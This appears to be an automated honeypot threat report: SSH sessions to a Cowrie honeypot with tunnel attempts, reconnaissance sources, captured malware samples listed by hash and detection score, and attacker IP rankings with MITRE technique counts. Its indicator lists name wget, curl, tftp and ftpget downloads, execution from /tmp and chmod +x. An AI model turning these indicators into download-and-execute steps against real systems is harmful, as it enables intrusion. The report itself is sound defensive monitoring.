### 🔴 HIGH · IR-c74a519f1de5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 08:43 |
| **Last Seen** | 2026-08-20 08:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:43:27` | `cowrie.session.connect` |
| `2026-08-20 08:43:27` | `cowrie.client.version` |
| `2026-08-20 08:43:29` | `cowrie.client.kex` |
| `2026-08-20 08:43:29` | `cowrie.login.success` |
| `2026-08-20 08:43:30` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:43:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 08:43:30` | `cowrie.direct-tcpip.data` |
| `2026-08-20 08:43:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73bbf74c6ef1

| Field | Detail |
|---|---|
| **Source IP** | `213.55.79[.]195` |
| **First Seen** | 2026-08-20 08:44 |
| **Last Seen** | 2026-08-20 08:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:44:25` | `cowrie.session.connect` |
| `2026-08-20 08:44:26` | `cowrie.client.version` |
| `2026-08-20 08:44:26` | `cowrie.client.kex` |
| `2026-08-20 08:44:28` | `cowrie.login.success` |
| `2026-08-20 08:44:28` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:44:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.55.79[.]195` to AbuseIPDB if not already reported
- [ ] Block `213.55.79[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4093883eec39

| Field | Detail |
|---|---|
| **Source IP** | `116.113.241[.]82` |
| **First Seen** | 2026-08-20 08:44 |
| **Last Seen** | 2026-08-20 08:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:44:34` | `cowrie.session.connect` |
| `2026-08-20 08:44:34` | `cowrie.client.version` |
| `2026-08-20 08:44:34` | `cowrie.client.kex` |
| `2026-08-20 08:44:37` | `cowrie.login.success` |
| `2026-08-20 08:44:37` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:44:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.113.241[.]82` to AbuseIPDB if not already reported
- [ ] Block `116.113.241[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-517e4697666e

| Field | Detail |
|---|---|
| **Source IP** | `116.72.9[.]151` |
| **First Seen** | 2026-08-20 08:44 |
| **Last Seen** | 2026-08-20 08:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:44:39` | `cowrie.session.connect` |
| `2026-08-20 08:44:40` | `cowrie.client.version` |
| `2026-08-20 08:44:40` | `cowrie.client.kex` |
| `2026-08-20 08:44:43` | `cowrie.login.success` |
| `2026-08-20 08:44:44` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:44:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.72.9[.]151` to AbuseIPDB if not already reported
- [ ] Block `116.72.9[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0192857cd158

| Field | Detail |
|---|---|
| **Source IP** | `179.185.18[.]67` |
| **First Seen** | 2026-08-20 08:44 |
| **Last Seen** | 2026-08-20 08:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:44:49` | `cowrie.session.connect` |
| `2026-08-20 08:44:50` | `cowrie.client.version` |
| `2026-08-20 08:44:50` | `cowrie.client.kex` |
| `2026-08-20 08:44:53` | `cowrie.login.success` |
| `2026-08-20 08:44:53` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:44:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.18[.]67` to AbuseIPDB if not already reported
- [ ] Block `179.185.18[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec8289f055a1

| Field | Detail |
|---|---|
| **Source IP** | `60.173.105[.]206` |
| **First Seen** | 2026-08-20 08:46 |
| **Last Seen** | 2026-08-20 08:46 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:46:06` | `cowrie.session.connect` |
| `2026-08-20 08:46:07` | `cowrie.client.version` |
| `2026-08-20 08:46:07` | `cowrie.client.kex` |
| `2026-08-20 08:46:10` | `cowrie.login.success` |
| `2026-08-20 08:46:11` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:46:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.173.105[.]206` to AbuseIPDB if not already reported
- [ ] Block `60.173.105[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c662d372ad97

| Field | Detail |
|---|---|
| **Source IP** | `220.178.246[.]43` |
| **First Seen** | 2026-08-20 08:46 |
| **Last Seen** | 2026-08-20 08:46 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:46:16` | `cowrie.session.connect` |
| `2026-08-20 08:46:17` | `cowrie.client.version` |
| `2026-08-20 08:46:17` | `cowrie.client.kex` |
| `2026-08-20 08:46:21` | `cowrie.login.success` |
| `2026-08-20 08:46:22` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:46:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.178.246[.]43` to AbuseIPDB if not already reported
- [ ] Block `220.178.246[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86393bf6d2fd

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-20 08:46 |
| **Last Seen** | 2026-08-20 08:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:46:43` | `cowrie.session.connect` |
| `2026-08-20 08:46:43` | `cowrie.client.version` |
| `2026-08-20 08:46:43` | `cowrie.client.kex` |
| `2026-08-20 08:46:43` | `cowrie.login.success` |
| `2026-08-20 08:46:43` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:46:43` | `cowrie.direct-tcpip.data` |
| `2026-08-20 08:46:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0657d72f924

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 08:51 |
| **Last Seen** | 2026-08-20 08:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:51:16` | `cowrie.session.connect` |
| `2026-08-20 08:51:16` | `cowrie.client.version` |
| `2026-08-20 08:51:16` | `cowrie.client.kex` |
| `2026-08-20 08:51:17` | `cowrie.login.success` |
| `2026-08-20 08:51:19` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:51:19` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 08:51:19` | `cowrie.direct-tcpip.data` |
| `2026-08-20 08:51:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c33be3ca689

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 08:54 |
| **Last Seen** | 2026-08-20 08:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 08:54:26` | `cowrie.session.connect` |
| `2026-08-20 08:54:26` | `cowrie.client.version` |
| `2026-08-20 08:54:26` | `cowrie.client.kex` |
| `2026-08-20 08:54:29` | `cowrie.login.success` |
| `2026-08-20 08:54:32` | `cowrie.direct-tcpip.request` |
| `2026-08-20 08:54:32` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 08:54:32` | `cowrie.direct-tcpip.data` |
| `2026-08-20 08:54:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **64** | 2026-08-20 06:57 | 2026-08-20 08:54 | 80m | 0 | `T1592` | 🟠 MEDIUM |
| `34.62.37[.]103` | **30** | 2026-08-20 06:56 | 2026-08-20 06:57 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `35.205.21[.]112` | **30** | 2026-08-20 07:49 | 2026-08-20 07:49 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `207.175.238[.]241` | **9** | 2026-08-20 07:48 | 2026-08-20 07:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-08-20 07:02 | 2026-08-20 08:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]223` | **3** | 2026-08-20 08:41 | 2026-08-20 08:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.170.155[.]208` | **2** | 2026-08-20 07:14 | 2026-08-20 07:16 | 2m | 0 | `T1592` | 🟢 LOW |
| `112.116.164[.]136` | 1 | 2026-08-20 07:21 | 2026-08-20 07:21 | 6s | 0 | `T1592` | 🟢 LOW |
| `117.223.152[.]94` | 1 | 2026-08-20 07:04 | 2026-08-20 07:04 | 8s | 0 | `T1592` | 🟢 LOW |
| `152.53.81[.]25` | 1 | 2026-08-20 08:07 | 2026-08-20 08:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `157.10.109[.]66` | 1 | 2026-08-20 07:04 | 2026-08-20 07:05 | 13s | 0 | `T1592` | 🟢 LOW |
| `173.255.221[.]189` | 1 | 2026-08-20 07:36 | 2026-08-20 07:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `181.225.32[.]51` | 1 | 2026-08-20 08:16 | 2026-08-20 08:16 | 11s | 0 | `T1592` | 🟢 LOW |
| `182.244.5[.]153` | 1 | 2026-08-20 07:45 | 2026-08-20 07:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `190.90.79[.]29` | 1 | 2026-08-20 07:55 | 2026-08-20 07:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.47.62[.]69` | 1 | 2026-08-20 07:08 | 2026-08-20 07:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.69.53[.]138` | 1 | 2026-08-20 07:32 | 2026-08-20 07:32 | 11s | 0 | `T1592` | 🟢 LOW |
| `210.16.100[.]120` | 1 | 2026-08-20 07:37 | 2026-08-20 07:38 | 37s | 0 | `T1592` | 🟢 LOW |
| `217.113.13[.]23` | 1 | 2026-08-20 08:40 | 2026-08-20 08:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.146.255[.]221` | 1 | 2026-08-20 08:40 | 2026-08-20 08:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `34.77.186[.]60` | 1 | 2026-08-20 07:48 | 2026-08-20 07:48 | 7s | 0 | `T1592` | 🟢 LOW |
| `37.186.41[.]198` | 1 | 2026-08-20 08:21 | 2026-08-20 08:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]122` | 1 | 2026-08-20 08:37 | 2026-08-20 08:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-08-20 08:40 | 2026-08-20 08:40 | 1s | 0 | `T1592` | 🟢 LOW |
| `49.124.150[.]250` | 1 | 2026-08-20 07:40 | 2026-08-20 07:40 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `58.57.154[.]146` | CN | CHINANET SHANDONG PROVINCE NETWORK | **100** ⚠️ | 50 |
| `34.62.37[.]103` | BE | Google LLC | **100** ⚠️ | 0 |
| `81.195.152[.]14` | RU | OOO Uneks-Euro & Co | **100** ⚠️ | 7 |
| `175.43.162[.]214` | CN | Quanzhou city, fujian provincial network of UNICOM | **100** ⚠️ | 6 |
| `213.55.79[.]195` | ET | Ethio Telecom | **100** ⚠️ | 50 |
| `65.20.217[.]64` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `116.72.9[.]151` | IN | HATHWAY CABLE AND DATACOM LIMITED | **100** ⚠️ | 50 |
| `36.154.134[.]146` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `35.205.21[.]112` | BE | Google LLC | **100** ⚠️ | 0 |
| `70.91.135[.]181` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 77 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 64 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 2 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (12 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 237 cases |
| Tool 34  | Credential Extractor        | ✅ 231 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 72 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 12 filtered (5.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 50 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 20 classified |
